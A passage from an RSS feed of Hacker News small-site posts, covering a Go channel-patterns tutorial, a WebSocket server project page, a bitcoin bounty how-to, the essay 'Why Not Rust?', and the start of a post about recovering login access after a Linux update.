import (
	"fmt"
	"time"
	"math/rand"
)

func source(c chan&lt;- int32) {
	ra, rb := rand.Int31(), rand.Intn(3) + 1
	// Sleep 1s/2s/3s.
	time.Sleep(time.Duration(rb) * time.Second)
	c &lt;- ra
}

func main() {
	rand.Seed(time.Now().UnixNano())

	startTime := time.Now()
	// c must be a buffered channel.
	c := make(chan int32, 5)
	for i := 0; i &lt; cap(c); i++ {
		go source(c)
	}
	// Only the first response will be used.
	rnd := &lt;- c
	fmt.Println(time.Since(startTime))
	fmt.Println(rnd)
}
</code></pre>

<p>
There are some other ways to implement the first-response-win use case,
by using the select mechanism and a buffered channel
whose capacity is one. Other ways will be introduced below.
</p>

</div>

<h4>More request-response variants</h4>

<p>
The parameter and result channels can be buffered so that
the response sides won't need to wait for the request sides
to take out the transferred values.
</p>

<p>
Sometimes, a request is not guaranteed to be responded back a valid value.
For all kinds of reasons, an error may be returned instead.
For such cases, we can use a struct type like
<code>struct{v T; err error}</code> or a blank interface type
as the channel element type.
</p>

<p>
Sometimes, for some reasons, the response may need
a much longer time than the expected to arrive, or will never arrive.
We can use the timeout mechanism introduced below
to handle such circumstances.
</p>

<p>
Sometimes, a sequence of values may be returned from the response side,
this is kind of the data flow mechanism mentioned later below.
</p>

<h3>Use Channels for Notifications</h3>

<p>
Notifications can be viewed as special requests/responses
in which the responded values are not important.
Generally, we use the blank struct type <code>struct{}</code>
as the element types of the notification channels,
for the size of type <code>struct{}</code> is zero,
hence values of <code>struct{}</code> doesn't consume memory.
</p>

<h4>1-to-1 notification by sending a value to a channel</h4>

<div>
<p>
If there are no values to be received from a channel,
then the next receive operation on the channel will block
until another goroutine sends a value to the channel.
So we can send a value to a channel to notify another goroutine
which is waiting to receive a value from the same channel.
</p><p>

In the following example, the channel <code>done</code>
is used as a signal channel to do notifications.

</p><pre><code>package main

import (
	"crypto/rand"
	"fmt"
	"os"
	"sort"
)

func main() {
	values := make([]byte, 32 * 1024 * 1024)
	if _, err := rand.Read(values); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	done := make(chan struct{}) // can be buffered or not

	// The sorting goroutine
	go func() {
		sort.Slice(values, func(i, j int) bool {
			return values[i] &lt; values[j]
		})
		// Notify sorting is done.
		done &lt;- struct{}{}
	}()

	// do some other things ...

	&lt;- done // waiting here for notification
	fmt.Println(values[0], values[len(values)-1])
}
</code></pre>


</div>

<h4>1-to-1 notification by receiving a value from a channel</h4>

<div>
<p>
If the value buffer queue of a channel is full
(the buffer queue of an unbuffered channel is always full),
a send operation on the channel will block
until another goroutine receives a value from the channel.
So we can receive a value from a channel to notify another goroutine
which is waiting to send a value to the same channel.
Generally, the channel should be an unbuffered channel.
</p>

<p>
This notification way is used much less common than
the way introduced in the last example.
</p>

<pre><code>package main

import (
	"fmt"
	"time"
)

func main() {
	done := make(chan struct{})
		// The capacity of the signal channel can
		// also be one. If this is true, then a
		// value must be sent to the channel before
		// creating the following goroutine.

	go func() {
		fmt.Print("Hello")
		// Simulate a workload.
		time.Sleep(time.Second * 2)

		// Receive a value from the done
		// channel, to unblock the second
		// send in main goroutine.
		&lt;- done
	}()

	// Blocked here, wait for a notification.
	done &lt;- struct{}{}
	fmt.Println(" world!")
}
</code></pre>



<p>
In fact, there are no fundamental differences between
receiving or sending values to make notifications.
They can both be summarized as the fasters are notified by the slowers.
</p>

</div>

<h4>N-to-1 and 1-to-N notifications</h4>

<div><p>
By extending the above two use cases a little,
it is easy to do N-to-1 and 1-to-N notifications.

</p><pre><code>package main

import "log"
import "time"

type T = struct{}

func worker(id int, ready &lt;-chan T, done chan&lt;- T) {
	&lt;-ready // block here and wait a notification
	log.Print("Worker#", id, " starts.")
	// Simulate a workload.
	time.Sleep(time.Second * time.Duration(id+1))
	log.Print("Worker#", id, " job done.")
	// Notify the main goroutine (N-to-1),
	done &lt;- T{}
}

func main() {
	log.SetFlags(0)

	ready, done := make(chan T), make(chan T)
	go worker(0, ready, done)
	go worker(1, ready, done)
	go worker(2, ready, done)

	// Simulate an initialization phase.
	time.Sleep(time.Second * 3 / 2)
	// 1-to-N notifications.
	ready &lt;- T{}; ready &lt;- T{}; ready &lt;- T{}
	// Being N-to-1 notified.
	&lt;-done; &lt;-done; &lt;-done
}
</code></pre>

<p>
In fact, the ways to do 1-to-N and N-to-1 notifications introduced
in this sub-section are not used commonly in practice.
In practice, we often use <code>sync.WaitGroup</code> to do N-to-1 notifications,
and we do 1-to-N notifications by close channels.
Please read the next sub-section for details.
</p>
</div>

<h4>Broadcast (1-to-N) notifications by closing a channel</h4>

<div>

<p>
The way to do 1-to-N notifications shown in the last sub-section
is seldom used in practice, for there is a better way.
By making using of the feature that infinite values can be received from
a closed channel, we can close a channel to broadcast notifications.
</p><p>

By the example in the last sub-section,
we can replace the three channel send operations
<code>ready &lt;- struct{}{}</code> in the last example
with one channel close operation <code>close(ready)</code>
to do an 1-to-N notifications.

</p><pre><code>...
	close(ready) // broadcast notifications
...
</code></pre>

<p>
Surely, we can also close a channel to do a 1-to-1 notification.
In fact, this is the most used ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.go101.org/article/channel-use-cases.html">https://www.go101.org/article/channel-use-cases.html</a></em></p>]]>
            </description>
            <link>https://www.go101.org/article/channel-use-cases.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592242</guid>
            <pubDate>Fri, 25 Sep 2020 17:44:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: WSServer ‚Äì A websocker server in C ‚Äì v2.0.0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24592201">thread link</a>) | @mortz
<br/>
September 25, 2020 | https://mortzdk.github.io/Websocket/ | <a href="https://web.archive.org/web/*/https://mortzdk.github.io/Websocket/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

            <section>
                <div>
                    
                    <p>A small, fast, configurable, extendable WebSocket server.</p>
                    
                </div>
            </section>

            <div>
                <div>
                    <div>
                        <div>
                            <div>
                                <p><img width="300" height="300" src="https://mortzdk.github.io/Websocket/images/tools.png"></p><div>
                                    <p>The newest version of the server was released at: <i>2020-09-25</i>. The current version of the WSServer is v2.0.5.</p>
                                    
                                </div>
                            </div>
                        </div>

                        <div>
                            <div>
                                <p><img width="300" height="300" src="https://mortzdk.github.io/Websocket/images/gear.png"></p><div>
                                    <p>WSServer is configurable using a JSON configuration file. The server can be configured in a vast number of ways.</p>
                                    
                                </div>
                            </div>
                        </div>

                        <div>
                            <div>
                                <p><img width="300" height="300" src="https://mortzdk.github.io/Websocket/images/approved.png"></p><div>
                                    <p>Extensively tested using the Autobahn Testsuite and unit tests written with Criterion.</p>
                                    
                                </div>
                            </div>
                        </div>

                        <div>
                            <div>
                                <p><img width="300" height="300" src="https://mortzdk.github.io/Websocket/images/code.png"></p><div>
                                    <p> We further strive to have as much code covered as possible.</p>
                                    
                                </div>
                            </div>
                        </div>

                        <div>
                            <div>
                                <p><img width="300" height="300" src="https://mortzdk.github.io/Websocket/images/note.png"></p><div>
                                    <p>We strive to keep the source code well commented. Moreover we autogenerate documentation of the source code.</p>
                                    
                                </div>
                            </div>
                        </div>

                        <div>
                            <div>
                                <p><img width="300" height="300" src="https://mortzdk.github.io/Websocket/images/brick.png"></p><div>
                                    <p>WSServer is highly extendable. You can add your own extensions and subprotocols as long as they adhere to a simple API.</p>
                                    
                                </div>
                            </div>
                        </div>

                        <div>
                            <div>
                                <p><img width="300" height="300" src="https://mortzdk.github.io/Websocket/images/chain.png"></p><div>
                                    <p>WSServer runs out of the box with no dependencies. However to enable features such as WebSockets over TLS (wss://) and compression (permessage-deflate extension), OpenSSL and zlib must be installed.</p>
                                    
                                </div>
                            </div>
                        </div>

                        <div>
                            <div>
                                <p><img width="300" height="300" src="https://mortzdk.github.io/Websocket/images/os.png"></p><div>
                                    <p>WSServer strive to support Linux, MacOS and FreeBSD.</p>
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div><div>
            <div>
                <p>
                <a href="#">Back to top</a>
                </p>
                <p>Copyright ¬© WSServer - Morten Houm√∏ller Nygaard</p>
            </div>
        </div></div>]]>
            </description>
            <link>https://mortzdk.github.io/Websocket/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592201</guid>
            <pubDate>Fri, 25 Sep 2020 17:41:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Pay for Bitcoin Development]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24592180">thread link</a>) | @ca98am79
<br/>
September 25, 2020 | https://www.pierrerochard.com/how-to-pay-for-bitcoin-development/ | <a href="https://web.archive.org/web/*/https://www.pierrerochard.com/how-to-pay-for-bitcoin-development/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
        <div>

            <article>

                <header>


                    

                        <p>Want to pay developers to work on Bitcoin for you? Here's how!</p>

                    <div>

                        <section>

                            <ul>
                                    <li>

                                        <div>
                                                <p><img src="https://www.pierrerochard.com/content/images/size/w100/2020/09/pierre-cowboy.jpg" alt="Pierre Rochard"></p>
                                        </div>

                                            <a href="https://www.pierrerochard.com/author/pierre/">
                                                <img src="https://www.pierrerochard.com/content/images/size/w100/2020/09/pierre-cowboy.jpg" alt="Pierre Rochard">
                                            </a>

                                    </li>
                            </ul>

                            <section>
                                <h4><a href="https://www.pierrerochard.com/author/pierre/">Pierre Rochard</a></h4>
                                <p><time datetime="2020-09-24">24 Sep 2020</time>
                                    <span><span>‚Ä¢</span> 2 min read</span>
                                </p>
                            </section>

                        </section>


                    </div>
                </header>


                        <figure>
                            <img srcset="https://www.pierrerochard.com/content/images/size/w300/2020/09/Screen-Shot-2020-09-24-at-2.31.43-PM.png 300w,
                                https://www.pierrerochard.com/content/images/size/w600/2020/09/Screen-Shot-2020-09-24-at-2.31.43-PM.png 600w,
                                https://www.pierrerochard.com/content/images/size/w1200/2020/09/Screen-Shot-2020-09-24-at-2.31.43-PM.png 1000w,
                                https://www.pierrerochard.com/content/images/size/w2000/2020/09/Screen-Shot-2020-09-24-at-2.31.43-PM.png 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 1170px,
                                2000px" src="https://www.pierrerochard.com/content/images/size/w2000/2020/09/Screen-Shot-2020-09-24-at-2.31.43-PM.png" alt="How to Pay for Bitcoin Development">
                        </figure>
                    <section>
                        <div>
                            <ol><li>Go to <a href="https://bitcoinacks.com/">BitcoinACKs.com</a></li></ol><figure><img src="https://www.pierrerochard.com/content/images/2020/09/image.png" alt="" srcset="https://www.pierrerochard.com/content/images/size/w600/2020/09/image.png 600w, https://www.pierrerochard.com/content/images/size/w1000/2020/09/image.png 1000w, https://www.pierrerochard.com/content/images/size/w1600/2020/09/image.png 1600w, https://www.pierrerochard.com/content/images/size/w2400/2020/09/image.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>2. Find a pull request that you want to sponsor and click its <strong>Pledge ‡∏ø</strong> button</p><figure><img src="https://www.pierrerochard.com/content/images/2020/09/image-1.png" alt="" srcset="https://www.pierrerochard.com/content/images/size/w600/2020/09/image-1.png 600w, https://www.pierrerochard.com/content/images/size/w1000/2020/09/image-1.png 1000w, https://www.pierrerochard.com/content/images/size/w1600/2020/09/image-1.png 1600w, https://www.pierrerochard.com/content/images/size/w2400/2020/09/image-1.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>3. Sign in to GitHub</p><figure><img src="https://www.pierrerochard.com/content/images/2020/09/image-2.png" alt="" srcset="https://www.pierrerochard.com/content/images/size/w600/2020/09/image-2.png 600w, https://www.pierrerochard.com/content/images/size/w1000/2020/09/image-2.png 1000w, https://www.pierrerochard.com/content/images/size/w1600/2020/09/image-2.png 1600w, https://www.pierrerochard.com/content/images/2020/09/image-2.png 1664w" sizes="(min-width: 720px) 720px"></figure><p>4. Authorize the OAuth</p><figure><img src="https://www.pierrerochard.com/content/images/2020/09/image-6.png" alt="" srcset="https://www.pierrerochard.com/content/images/size/w600/2020/09/image-6.png 600w, https://www.pierrerochard.com/content/images/size/w1000/2020/09/image-6.png 1000w, https://www.pierrerochard.com/content/images/size/w1600/2020/09/image-6.png 1600w, https://www.pierrerochard.com/content/images/2020/09/image-6.png 1664w" sizes="(min-width: 720px) 720px"></figure><p>5. Decide how many satoshis you want to pledge and hit save</p><figure><img src="https://www.pierrerochard.com/content/images/2020/09/image-7.png" alt="" srcset="https://www.pierrerochard.com/content/images/size/w600/2020/09/image-7.png 600w, https://www.pierrerochard.com/content/images/size/w1000/2020/09/image-7.png 1000w, https://www.pierrerochard.com/content/images/size/w1600/2020/09/image-7.png 1600w, https://www.pierrerochard.com/content/images/2020/09/image-7.png 1762w" sizes="(min-width: 720px) 720px"></figure><p>6. Done! The total amount pledged has increased</p><figure><img src="https://www.pierrerochard.com/content/images/2020/09/image-8.png" alt="" srcset="https://www.pierrerochard.com/content/images/size/w600/2020/09/image-8.png 600w, https://www.pierrerochard.com/content/images/size/w1000/2020/09/image-8.png 1000w, https://www.pierrerochard.com/content/images/size/w1600/2020/09/image-8.png 1600w, https://www.pierrerochard.com/content/images/2020/09/image-8.png 1762w" sizes="(min-width: 720px) 720px"></figure><p>7. When you're satisfied with the pull request, go to Bounties Payable and click Pay</p><figure><img src="https://www.pierrerochard.com/content/images/2020/09/image-9.png" alt="" srcset="https://www.pierrerochard.com/content/images/size/w600/2020/09/image-9.png 600w, https://www.pierrerochard.com/content/images/size/w1000/2020/09/image-9.png 1000w, https://www.pierrerochard.com/content/images/size/w1600/2020/09/image-9.png 1600w, https://www.pierrerochard.com/content/images/2020/09/image-9.png 1762w" sizes="(min-width: 720px) 720px"></figure><p>8. Pay the developer's invoice to them directly, BitcoinACKs is 100% non-custodial</p><figure><img src="https://www.pierrerochard.com/content/images/2020/09/image-10.png" alt="" srcset="https://www.pierrerochard.com/content/images/size/w600/2020/09/image-10.png 600w, https://www.pierrerochard.com/content/images/size/w1000/2020/09/image-10.png 1000w, https://www.pierrerochard.com/content/images/size/w1600/2020/09/image-10.png 1600w, https://www.pierrerochard.com/content/images/2020/09/image-10.png 1774w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.pierrerochard.com/content/images/2020/09/image-11.png" alt="" srcset="https://www.pierrerochard.com/content/images/size/w600/2020/09/image-11.png 600w, https://www.pierrerochard.com/content/images/size/w1000/2020/09/image-11.png 1000w, https://www.pierrerochard.com/content/images/size/w1600/2020/09/image-11.png 1600w, https://www.pierrerochard.com/content/images/2020/09/image-11.png 1774w" sizes="(min-width: 720px) 720px"></figure><p>9. You're done! You'll see the invoice marked as <strong>paid</strong> or complete</p><figure><img src="https://www.pierrerochard.com/content/images/2020/09/image-12.png" alt="" srcset="https://www.pierrerochard.com/content/images/size/w600/2020/09/image-12.png 600w, https://www.pierrerochard.com/content/images/size/w1000/2020/09/image-12.png 1000w, https://www.pierrerochard.com/content/images/size/w1600/2020/09/image-12.png 1600w, https://www.pierrerochard.com/content/images/2020/09/image-12.png 1760w" sizes="(min-width: 720px) 720px"></figure>
                        </div>
                    </section>



            </article>

        </div>
    </div></div>]]>
            </description>
            <link>https://www.pierrerochard.com/how-to-pay-for-bitcoin-development/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592180</guid>
            <pubDate>Fri, 25 Sep 2020 17:39:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Burden of Expectation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24592170">thread link</a>) | @daretorant
<br/>
September 25, 2020 | https://salman.io/blog/ | <a href="https://web.archive.org/web/*/https://salman.io/blog/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://salman.io/blog/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592170</guid>
            <pubDate>Fri, 25 Sep 2020 17:38:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Not Rust?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24592017">thread link</a>) | @elorant
<br/>
September 25, 2020 | https://matklad.github.io//2020/09/20/why-not-rust.html | <a href="https://web.archive.org/web/*/https://matklad.github.io//2020/09/20/why-not-rust.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
  
  <p>Sep 20, 2020</p>
  <p>I‚Äôve recently read an article criticizing Rust, and, while it made a bunch of good points, I didn‚Äôt enjoy it‚Äâ‚Äî‚Äâit was an easy to argue with piece.
In general, I feel that I can‚Äôt recommend an article criticizing Rust.
This is a shame‚Äâ‚Äî‚Äâconfronting drawbacks is important, and debunking low effort/miss informed attempts at critique sadly inoculates against actually good arguments.</p>
<p>So, here‚Äôs my attempt to argue <em>against</em> Rust:</p>
<div>
<dl>
<dt>Not All Programming is Systems Programming</dt>
<dd>
<div>
<div>
<p>Rust is a systems programming language.
It offers precise control over data layout and runtime behavior of the code, granting  you maximal performance and flexibility.
Unlike other systems programming languages, it also provides memory safety‚Äâ‚Äî‚Äâbuggy programs terminate in a well-defined manner, instead of unleashing (potentially security-sensitive) undefined behavior.</p>
<p>However, in many (most) cases, one doesn‚Äôt need ultimate performance or control over hardware resources.
For these situations, modern managed languages like Kotlin or Go offer decent speed, enviable
<a href="https://qconlondon.com/london-2017/system/files/presentation-slides/highperformancemanagedlanguages.pdf">time to performance</a>, and are memory safe by virtue of using a garbage collector for dynamic memory management.</p>
</div>
</div>
</dd>
<dt>Complexity</dt>
<dd>
<div>
<div>
<p>Programmer‚Äôs time is valuable, and, if you pick Rust, expect to spend some of it on learning the ropes.
Rust community poured a lot of time into creating high-quality teaching materials, but the Rust language <em>is</em> big.
Even if a Rust implementation would provide value for you, you might not have resources to invest into growing the language expertise.</p>
<p>Rust‚Äôs price for improved control is the curse of choice:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Bar</span>         <span>}</span>
<span>struct</span> <span>Foo</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span> <span>bar</span><span>:</span> <span>&amp;</span><span>'a</span> <span>Bar</span>     <span>}</span>
<span>struct</span> <span>Foo</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span> <span>bar</span><span>:</span> <span>&amp;</span><span>'a</span> <span>mut</span> <span>Bar</span> <span>}</span>
<span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Box</span><span>&lt;</span><span>Bar</span><span>&gt;</span>    <span>}</span>
<span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Rc</span><span>&lt;</span><span>Bar</span><span>&gt;</span>     <span>}</span>
<span>struct</span> <span>Foo</span>     <span>{</span> <span>bar</span><span>:</span> <span>Arc</span><span>&lt;</span><span>Bar</span><span>&gt;</span>    <span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>In Kotlin, you write <code>class Foo(val bar: Bar)</code>, and proceed with solving your business problem.
In Rust, there are choices to be made, some important enough to have dedicated syntax.</p>
<p>All this complexity is there for a reason‚Äâ‚Äî‚Äâwe don‚Äôt know how to create a simpler memory safe low-level language.
But not every task requires a low-level language to solve it.</p>

</div>
</div>
</dd>
<dt>Compile Times</dt>
<dd>
<div>
<div>
<p>Compile times are a multiplier for everything.
A program written in a slower to run but faster to compile programming language can be <em>faster</em> to run because the programmer will have more time to optimize!</p>
<p>Rust intentionally picked slow compilers in the <a href="https://research.swtch.com/generic">generics dilemma</a>.
This is not necessary the end of the world (the resulting runtime performance improvements are real), but it does mean that you‚Äôll have to fight tooth and nail for reasonable build times in larger projects.</p>
<p><code>rustc</code> implements what is probably the most advanced <a href="https://rustc-dev-guide.rust-lang.org/queries/incremental-compilation.html">incremental compilation</a> algorithm in production compilers, but this feels a bit like fighting with language compilation model.</p>
<p>Unlike C++, Rust build is not embarrassingly parallel; the amount of parallelism is limited by length of the critical path in the dependency graph.
If you have 40+ cores to compile, this shows.</p>
<p>Rust also lacks an analog for the <a href="https://en.cppreference.com/w/cpp/language/pimpl">pimpl</a> idiom, which means that changing a crate requires recompiling (and not just relinking) all of its reverse dependencies.</p>
</div>
</div>
</dd>
<dt>Maturity</dt>
<dd>
<div>
<div>
<p>Five years old, Rust is definitely a young language.
Even though its future looks bright, I will bet more money on ‚ÄúC will be around in ten years‚Äù than on ‚ÄúRust will be around in ten years‚Äù
(See <a href="https://en.wikipedia.org/wiki/Lindy_effect">Lindy Effect</a>).
If you are writing software to last decades, you should seriously consider risks associated with picking new technologies.
(But keep in mind that picking Java over Cobol for banking software in 90s retrospectively turned out to be the right choice).</p>
<p>There‚Äôs only one complete implementation of Rust‚Äâ‚Äî‚Äâthe <a href="https://github.com/rust-lang/rust/"><code>rustc</code></a> compiler.
The most advanced alternative implementation, <a href="https://github.com/thepowersgang/mrustc"><code>mrustc</code></a>, purposefully omits many static safety checks.
<code>rustc</code> at the moment supports only a single production-ready backend‚Äâ‚Äî‚ÄâLLVM.
Hence, its support for CPU architectures is narrower than that of C, which has GCC implementation as well as a number of vendor specific proprietary compilers.</p>
<p>Finally, Rust lacks an official specification.
<a href="https://doc.rust-lang.org/reference/">The reference</a> is a work in progress, and does not yet document all the fine implementation details.</p>
</div>
</div>
</dd>
<dt>Alternatives</dt>
<dd>
<div>
<div>
<p>There are other languages besides Rust in systems programming space, notably, C, C++, and Ada.</p>
<p>Modern C++ provides <a href="https://www.viva64.com/en/pvs-studio/">tools</a> and <a href="https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines">guidelines</a> for improving safety.
There‚Äôs even a proposal for a Rust-like <a href="https://github.com/isocpp/CppCoreGuidelines/blob/master/docs/Lifetime.pdf">lifetimes</a> mechanism!
Unlike Rust, using these tools does not <em>guarantee</em> the absence of memory safety issues.
However, if you already maintain a large body of C++ code, it makes sense to check if following best practices and using <a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">sanitizers</a> helps with security issues.
This is hard, but clearly is easier than rewriting in another language!</p>
<p>If you use C, you can use formal methods to <a href="https://sel4.systems/Info/FAQ/proof.pml">prove</a> the absence of undefined behaviors, or just <a href="https://sqlite.org/testing.html">exhaustively test</a> everything.</p>
<p>Ada is memory safe if you don‚Äôt use dynamic memory (never call <code>free</code>).</p>
<p>Rust is an interesting point on the cost/safety curve, but is far from the only one!</p>
</div>
</div>
</dd>
<dt>Tooling</dt>
<dd>
<div>
<div>
<p>Rust tooling is a bit of a hit and miss.
The baseline tooling, the compiler and the build system
(<a href="https://doc.rust-lang.org/cargo/index.html">cargo</a>), are often cited as best in class.</p>
<p>But, for example, some runtime-related tools (most notably, heap profiling) are just absent‚Äâ‚Äî‚Äâit‚Äôs hard to reflect on the runtime of the program if there‚Äôs no runtime!
Additionally, while IDE support is decent, it is nowhere near the Java-level of reliability.
Automated complex refactors of multi-million line programs are not possible in Rust today.</p>
</div>
</div>
</dd>
<dt>Integration</dt>
<dd>
<div>
<div>
<p>Whatever the Rust promise is, it‚Äôs a fact of life that today‚Äôs systems programming world speaks C, and is inhabited by C and C++.
Rust intentionally doesn‚Äôt try to mimic these languages‚Äâ‚Äî‚Äâit doesn‚Äôt use C++-style classes or C ABI.</p>
<p>That means that integration between the worlds needs explicit bridges.
These are not seamless.
They are <code>unsafe</code>, not always completely zero-cost and need to be synchronized between the languages.
While the general promise of <a href="http://adventures.michaelfbryan.com/posts/how-to-riir/">piece-wise integration</a> holds up and the <a href="https://github.com/dtolnay/cxx">tooling</a> catches up, there is accidental complexity along the way.</p>
<p>One specific gotcha is that Cargo‚Äôs opinionated world view (which <em>is</em> a blessing for pure Rust projects) might make it harder to integrate with a bigger build system.</p>
</div>
</div>
</dd>
<dt>Performance</dt>
<dd>
<div>
<div>
<p>‚ÄúUsing LLVM‚Äù is not a universal solution to all performance problems.
While I am not aware of benchmarks comparing performance of C++ and Rust at scale, it‚Äôs not to hard to come up with a list of cases where Rust leaves some performance on the table relative to C++.</p>
<p>The biggest one is probably the fact that Rust‚Äôs move semantics is based on values (<code>memcpy</code> at the machine code level).
In contrast, C++ semantics uses special references you can steal data from (pointers at the machine code level).
In theory, compiler should be able to see through chain of copies; in practice it often doesn‚Äôt: <a href="https://github.com/rust-lang/rust/issues/57077">#57077</a>.
A related problem is the absence of placement new‚Äâ‚Äî‚ÄâRust sometimes need to copy bytes to/from the stack, while C++ can construct the thing in place.</p>
<p>Somewhat amusingly, Rust‚Äôs default ABI (which is not stable, to make it as efficient as possible) is sometimes worse than that of C: <a href="https://github.com/rust-lang/rust/issues/26494#issuecomment-619506345">#26494</a>.</p>
<p>Finally, while in theory Rust code should be more efficient due to the significantly richer aliasing information, enabling aliasing-related optimizations triggers LLVM bugs and miscompilations: <a href="https://github.com/rust-lang/rust/issues/54878">#54878</a>.</p>
<p>But, to reiterate, these are cherry-picked examples, sometimes the field is tilted the other way.
For example, <code>std::unique_ptr</code> <a href="https://www.youtube.com/watch?v=rHIkrotSwcc&amp;feature=youtu.be&amp;t=1261">has a performance problem</a> which Rust‚Äôs <code>Box</code> lacks.</p>
<p>A potentially bigger issue is that Rust, with its definition time checked generics, is less expressive than C++.
So, some C++ <a href="http://eigen.tuxfamily.org/index.php?title=Expression_templates">template tricks</a> for high performance are not expressible in Rust using a nice syntax.</p>
</div>
</div>
</dd>
<dt>Meaning of Unsafe</dt>
<dd>
<div>
<div>
<p>An idea which is even more core to Rust than ownership &amp; borrowing is perhaps that of <code>unsafe</code> boundary.
That, by delineating all dangerous operations behind <code>unsafe</code> blocks and functions and insisting on providing a safe higher-level interface to them, it is possible to create a system which is both</p>
<div>
<ol>
<li>
<p>sound (non-<code>unsafe</code> code can‚Äôt cause undefined behavior),</p>
</li>
<li>
<p>and modular (different <code>unsafe</code> blocks can be checked separately).</p>
</li>
</ol>
</div>
<p>It‚Äôs pretty clear that the promise works out in practice: <a href="https://github.com/rust-fuzz/trophy-case">fuzzing Rust code</a> unearths panics, not buffer overruns.</p>
<p>But the theoretical outlook is not as rosy.</p>
<p><em>First</em>, there‚Äôs no definition of Rust memory model, so it is impossible to formally check if a given unsafe block is valid or not.
There‚Äôs informal definition of ‚Äúthings rustc does or might rely on‚Äù and in in-progress <a href="https://github.com/rust-lang/miri">runtime verifier</a>, but the actual model is in flux.
So there might be some <code>unsafe</code> code somewhere which works OK in practice today, might be declared invalid tomorrow, and broken by a new compiler optimization next year.</p>
<p><em>Second</em>, there‚Äôs also an observation that <code>unsafe</code> blocks are not, in fact, modular.
Sufficiently powerful <code>unsafe</code> blocks can, in effect, extend the language.
Two such extensions might be fine in isolation, but lead to undefined behavior if used simultaneously:
<a href="https://smallcultfollowing.com/babysteps/blog/2016/10/02/observational-equivalence-and-unsafe-code/">Observational equivalence and unsafe code</a>.</p>

</div>
</div>
</dd>
</dl>
</div>
<p>Here are some thing I‚Äôve deliberately omitted from the list:</p>
<div>
<ul>
<li>
<p>Economics (‚Äúit‚Äôs harder to hire Rust programmers‚Äù)‚Äâ‚Äî‚ÄâI feel that the ‚Äúmaturity‚Äù section captures the essence of it which is not reducible to chicken and egg problem.</p>
</li>
<li>
<p>Dependencies (‚Äústdlib is too small / everything has too many deps‚Äù)‚Äâ‚Äî‚Äâgiven how good Cargo and the relevant parts of the language are, I personally don‚Äôt see this as a problem.</p>
</li>
<li>
<p>Dynamic linking (‚ÄúRust should have stable ABI‚Äù)‚Äâ‚Äî‚ÄâI don‚Äôt think this is a strong argument. Monomorphization is pretty fundamentally incompatible with dynamic linking and there‚Äôs C ABI if you really need to. I do think that the situation here can be improved, <a href="https://internals.rust-lang.org/t/a-stable-modular-abi-for-rust/12347/10?u=matklad">but I don‚Äôt think that improvement needs to be Rust-specific</a>.</p>
</li>
</ul>
</div>

</article>

  </div></div>]]>
            </description>
            <link>https://matklad.github.io//2020/09/20/why-not-rust.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592017</guid>
            <pubDate>Fri, 25 Sep 2020 17:21:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking into My Computer After Getting Locked Out]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24592000">thread link</a>) | @ruborcalor
<br/>
September 25, 2020 | https://colekillian.com/posts/hacking-into-my-computer-after-getting-locked-out/ | <a href="https://web.archive.org/web/*/https://colekillian.com/posts/hacking-into-my-computer-after-getting-locked-out/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<p>I updated all the packages on my system with <code>pacman -Syyu</code>. Didn‚Äôt think much of it at the time.</p>
<p>Later in the day my computer froze when using bash to execute a python script I was developing (whoops).</p>
<p>After waiting a minute to see if my computer would recover, I initiated force shutdown.</p>
<p>I started up my computer as normal, but this time I couldn‚Äôt login! It was disheartening to be shown <code>Password Incorrect</code> over and over. Caps lock is off, check. Try a couple keyboards, check.</p>

<p>At first I was scared that the script I ran had somehow changed my password. Off to the newbie corner I go :). Uh oh, I hadn‚Äôt read the patch notes. Turns out updates to <code>PAM</code> and <code>PAMBASE</code> might prevent login. Other people were having the same problem, all I had to do was login with rescue mode!</p>
<p>I follow the instructions to boot rescue mode. i.e. pressing <code>e</code> on the grub screen to edit the boot parameters and adding the kernel option <code>systemd.unit=rescue.target</code>. I find myself in a terminal prompted for my root password; what‚Äôs my root password again? This can‚Äôt be good. How can I possibly login without my root password?!</p>
